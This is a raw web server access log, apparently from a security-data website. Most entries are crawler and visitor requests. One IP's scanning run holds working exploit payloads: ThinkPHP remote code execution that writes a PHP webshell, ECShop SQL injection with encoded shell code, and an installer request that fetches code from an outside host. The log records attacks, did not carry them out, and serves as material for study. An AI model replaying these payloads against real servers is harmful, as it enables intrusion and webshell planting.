114.119.149.222 - - [10/Oct/2022:08:49:06 -0700] "GET /self.logs/access.log.2018-02-13.gz HTTP/1.1" 200 38185 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
181.177.111.162 - - [10/Oct/2022:08:45:05 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 6278580 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68" 
157.55.39.38 - - [10/Oct/2022:08:52:38 -0700] "GET /self.logs/ HTTP/1.1" 200 38938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.140.174 - - [10/Oct/2022:09:00:15 -0700] "GET /self.logs/error.log.2017-06-19.gz HTTP/1.1" 200 918 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.9 - - [10/Oct/2022:09:00:59 -0700] "GET /robots.txt HTTP/1.1" 301 439 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.9 - - [10/Oct/2022:09:00:59 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.3 - - [10/Oct/2022:09:01:26 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/http.html HTTP/1.1" 200 1991 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
79.137.194.75 - - [10/Oct/2022:09:08:00 -0700] "GET / HTTP/1.1" 200 49089 "https://saunanovgorod.ru/" "Opera/7.60 (Windows NT 5.2; U)  [en] (IBM EVV/3.0/EAK01AG9/LE)" 
79.137.194.75 - - [10/Oct/2022:09:08:01 -0700] "GET / HTTP/1.1" 200 49089 "https://saunanovgorod.ru/" "Opera/7.60 (Windows NT 5.2; U)  [en] (IBM EVV/3.0/EAK01AG9/LE)" 
79.137.194.75 - - [10/Oct/2022:09:08:01 -0700] "GET / HTTP/1.1" 200 49089 "https://saunanovgorod.ru/" "Opera/7.60 (Windows NT 5.2; U)  [en] (IBM EVV/3.0/EAK01AG9/LE)" 
114.119.145.137 - - [10/Oct/2022:09:11:16 -0700] "GET /self.logs/access.log.2018-04-14.gz HTTP/1.1" 200 15954 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
195.191.219.131 - - [10/Oct/2022:09:13:37 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
195.191.219.131 - - [10/Oct/2022:09:13:39 -0700] "GET / HTTP/1.1" 200 13107 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
205.169.39.228 - - [10/Oct/2022:09:13:56 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:13:57 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:14:12 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:14:12 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:14:13 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:14:13 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
205.169.39.228 - - [10/Oct/2022:09:14:13 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
114.119.149.222 - - [10/Oct/2022:09:16:50 -0700] "GET /self.logs/2015/error.log.2015-12-27.gz HTTP/1.1" 200 698 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
157.55.39.38 - - [10/Oct/2022:09:21:32 -0700] "GET /self.logs/ HTTP/1.1" 200 38938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.23 - - [10/Oct/2022:09:22:23 -0700] "GET /self.logs/error.log.2018-02-11.gz HTTP/1.1" 200 6923 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
120.55.77.27 - - [10/Oct/2022:09:23:50 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
103.213.247.53 - - [10/Oct/2022:09:24:19 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 284 "www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:09:24:20 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=xajrr.php&updateHost=http://194.124.35.101:82/ HTTP/1.1" 418 747 "http://www.secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=xajrr.php&updateHost=http://194.124.35.101:82/" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; it-it) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16" 
103.213.247.53 - - [10/Oct/2022:09:24:20 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729)" 
103.213.247.53 - - [10/Oct/2022:09:24:21 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 250 "www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:09:24:21 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 305 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4" 
103.213.247.53 - - [10/Oct/2022:09:24:21 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/7.0.531.0 Safari/534.9" 
103.213.247.53 - - [10/Oct/2022:09:24:22 -0700] "POST /fdgq.php HTTP/1.1" 418 746 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.6 Safari/525.19" 
103.213.247.53 - - [10/Oct/2022:09:24:22 -0700] "GET /index.php HTTP/1.1" 404 305 "http://www.secrepo.com/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre" 
103.213.247.53 - - [10/Oct/2022:09:24:22 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729)" 
103.213.247.53 - - [10/Oct/2022:09:24:23 -0700] "POST /ysyqq.php HTTP/1.1" 418 746 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB6 (.NET CLR 3.5.30729)" 
103.213.247.53 - - [10/Oct/2022:09:24:23 -0700] "GET /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 404 305 "http://www.secrepo.com/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/5.0 (Windows; U; Windows NT 5.2; fr; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5" 
103.213.247.53 - - [10/Oct/2022:09:24:23 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nb-NO; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 (.NET CLR 3.5.30729)" 
103.213.247.53 - - [10/Oct/2022:09:24:24 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=jdvjb.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=jdvjb.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-GB; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6" 
103.213.247.53 - - [10/Oct/2022:09:24:24 -0700] "GET /jdvjb.php HTTP/1.1" 404 305 "http://www.secrepo.com/jdvjb.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11" 
103.213.247.53 - - [10/Oct/2022:09:24:24 -0700] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 305 "http://www.secrepo.com/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6" 
5.36.251.133 - - [10/Oct/2022:09:25:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15" 
5.36.251.133 - - [10/Oct/2022:09:25:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15" 
114.119.149.228 - - [10/Oct/2022:09:27:58 -0700] "GET /self.logs/error.log.2019-11-16.gz HTTP/1.1" 200 1372 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
35.235.68.5 - - [10/Oct/2022:09:34:46 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; Mozilla/5.0/0.10; +; )" 
107.167.35.138 - - [10/Oct/2022:09:49:08 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
157.55.39.38 - - [10/Oct/2022:09:51:14 -0700] "GET /self.logs/ HTTP/1.1" 200 38938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
107.167.35.138 - - [10/Oct/2022:09:53:23 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
114.119.149.218 - - [10/Oct/2022:10:01:47 -0700] "GET /self.logs/error.log.2018-10-25.gz HTTP/1.1" 200 4698 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
194.187.171.102 - - [10/Oct/2022:10:04:39 -0700] "GET /favicon.ico HTTP/1.1" 200 347 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
194.187.171.92 - - [10/Oct/2022:10:04:39 -0700] "GET / HTTP/1.1" 200 13139 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
194.187.171.155 - - [10/Oct/2022:10:04:39 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 669 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
114.119.149.237 - - [10/Oct/2022:10:12:59 -0700] "GET /self.logs/error.log.2017-10-07.gz HTTP/1.1" 200 2792 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
107.167.35.138 - - [10/Oct/2022:10:17:03 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
157.55.39.38 - - [10/Oct/2022:10:20:57 -0700] "GET /self.logs/ HTTP/1.1" 200 38938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.228 - - [10/Oct/2022:10:24:10 -0700] "GET /self.logs/access.log.2020-11-28.gz HTTP/1.1" 200 12604 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
35.235.68.5 - - [10/Oct/2022:10:26:22 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; Mozilla/5.0/0.10; +; )" 
40.77.167.63 - - [10/Oct/2022:10:27:14 -0700] "GET /self.logs/access.log.2017-05-12.gz HTTP/1.1" 200 56945 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
44.233.220.227 - - [10/Oct/2022:10:28:33 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)" 
44.233.220.227 - - [10/Oct/2022:10:28:33 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)" 
114.119.140.174 - - [10/Oct/2022:10:35:32 -0700] "GET /self.logs/error.log.2019-02-28.gz HTTP/1.1" 200 6214 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
103.213.247.53 - - [10/Oct/2022:10:41:58 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:10:41:59 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 328 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:10:42:00 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=zxzop.php&updateHost=http://194.124.35.101:82/ HTTP/1.1" 301 725 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=zxzop.php&updateHost=http://194.124.35.101:82/" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5" 
103.213.247.53 - - [10/Oct/2022:10:42:00 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 301 556 "http://secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0" 
103.213.247.53 - - [10/Oct/2022:10:42:00 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:10:42:01 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.213.247.53 - - [10/Oct/2022:10:42:01 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)" 
103.213.247.53 - - [10/Oct/2022:10:42:01 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.1 Safari/530.18" 
103.213.247.53 - - [10/Oct/2022:10:42:02 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0" 
103.213.247.53 - - [10/Oct/2022:10:42:02 -0700] "POST /fdgq.php HTTP/1.1" 301 490 "http://secrepo.com/fdgq.php" "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)" 
103.213.247.53 - - [10/Oct/2022:10:42:02 -0700] "GET /index.php HTTP/1.1" 301 492 "http://secrepo.com/index.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6" 
103.213.247.53 - - [10/Oct/2022:10:42:03 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB7.0 (.NET CLR 3.0.30618)" 
103.213.247.53 - - [10/Oct/2022:10:42:03 -0700] "POST /ysyqq.php HTTP/1.1" 301 492 "http://secrepo.com/ysyqq.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.0 Safari/532.2" 
103.213.247.53 - - [10/Oct/2022:10:42:03 -0700] "GET /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 301 542 "http://secrepo.com/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70" 
103.213.247.53 - - [10/Oct/2022:10:42:04 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 578 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Windows; U; Windows NT 6.0; cs; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13" 
103.213.247.53 - - [10/Oct/2022:10:42:04 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=hdlvs.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 301 904 "http://secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=hdlvs.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.53 Safari/534.30" 
103.213.247.53 - - [10/Oct/2022:10:42:04 -0700] "GET /hdlvs.php HTTP/1.1" 301 492 "http://secrepo.com/hdlvs.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5" 
103.213.247.53 - - [10/Oct/2022:10:42:05 -0700] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 301 566 "http://secrepo.com/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.20 Safari/532.0" 
114.119.140.174 - - [10/Oct/2022:10:46:55 -0700] "GET /self.logs/access.log.2019-10-26.gz HTTP/1.1" 200 11207 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
157.55.39.38 - - [10/Oct/2022:10:49:39 -0700] "GET /self.logs/ HTTP/1.1" 200 38938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
172.226.168.161 - - [10/Oct/2022:10:51:04 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
172.226.168.161 - - [10/Oct/2022:10:51:04 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
172.226.168.161 - - [10/Oct/2022:10:51:04 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
172.226.168.161 - - [10/Oct/2022:10:51:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
172.226.168.161 - - [10/Oct/2022:10:51:04 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
148.252.128.149 - - [10/Oct/2022:10:51:08 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
148.252.128.149 - - [10/Oct/2022:10:51:08 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
148.252.128.149 - - [10/Oct/2022:10:51:09 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
148.252.128.149 - - [10/Oct/2022:10:51:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
148.252.128.149 - - [10/Oct/2022:10:51:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
148.252.128.149 - - [10/Oct/2022:10:51:20 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36" 
172.226.168.161 - - [10/Oct/2022:10:51:31 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 11204040 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
114.119.149.228 - - [10/Oct/2022:10:52:40 -0700] "GET /self.logs/access.log.2018-07-27.gz HTTP/1.1" 200 25991 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
